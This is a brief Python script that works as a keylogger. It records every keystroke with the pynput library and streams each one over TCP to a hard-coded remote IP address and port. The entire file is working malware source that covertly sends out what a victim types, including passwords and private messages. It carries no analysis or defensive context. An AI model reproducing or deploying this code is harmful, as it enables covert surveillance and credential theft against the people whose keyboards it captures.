import socket
from pynput import keyboard

HOST = '172.105.172.98'
PORT = 65535

def on_press(key):
    global socket
    try:
        if key == keyboard.Key.enter:
            text = '\n'
        elif key == keyboard.Key.tab:
            text = '\t'
        elif key == keyboard.Key.space:
            text = ' '
        elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
            text = 'shift'
        elif key == keyboard.Key.backspace:
            text = 'backspace'
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            text = 'control'
        else:
            text = key.char
        
        s.send(text.encode('utf-8'))
    except AttributeError:
        s.send('Unkown Key'.encode('utf-8'))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    with keyboard.Listener(on_press = on_press) as listener:
        listener.join()
